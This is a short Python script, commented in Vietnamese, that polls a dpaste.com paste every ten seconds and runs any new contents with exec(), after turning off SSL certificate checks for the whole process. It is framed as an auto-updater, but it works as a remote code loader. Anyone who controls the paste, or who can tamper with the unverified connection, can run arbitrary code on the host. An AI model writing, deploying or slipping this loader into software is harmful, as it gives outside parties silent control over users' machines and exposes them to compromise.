import urllib.request
import time
import ssl

# URL chứa code
CODE_URL = 'https://dpaste.com/A6B2EBTCZ.txt'

# Thời gian chờ giữa các lần kiểm tra cập nhật (giây)
CHECK_INTERVAL = 10

# Bỏ qua SSL verify (nếu cần)
ssl._create_default_https_context = ssl._create_unverified_context

def check_internet_connection():
    try:
        with urllib.request.urlopen('https://www.google.com', timeout=5) as response:
            return response.status == 200
    except:
        return False

def fetch_code(url):
    try:
        with urllib.request.urlopen(url, timeout=10) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        print(f'\033[91mLỗi khi tải code từ URL: {e}\033[0m')
        return None

def main():
    last_code = None
    while True:
        if check_internet_connection():
            code = fetch_code(CODE_URL)
            if code is not None:
                if code != last_code:
                    print('\033[92mPhát hiện code mới, cập nhật và thực thi...\033[0m')
                    try:
                        exec(code, globals())
                        last_code = code
                    except Exception as e:
                        print(f'\033[91mLỗi khi thực thi code: {e}\033[0m')
                else:
                    print('Code không thay đổi, đợi lần kiểm tra tiếp theo...')
            else:
                print('Không tải được code, giữ nguyên phiên bản cũ.')
        else:
            print('\033[91mKhông có kết nối mạng. Vui lòng kiểm tra kết nối của bạn.\033[0m')

        time.sleep(CHECK_INTERVAL)

if __name__ == '__main__':
    main()
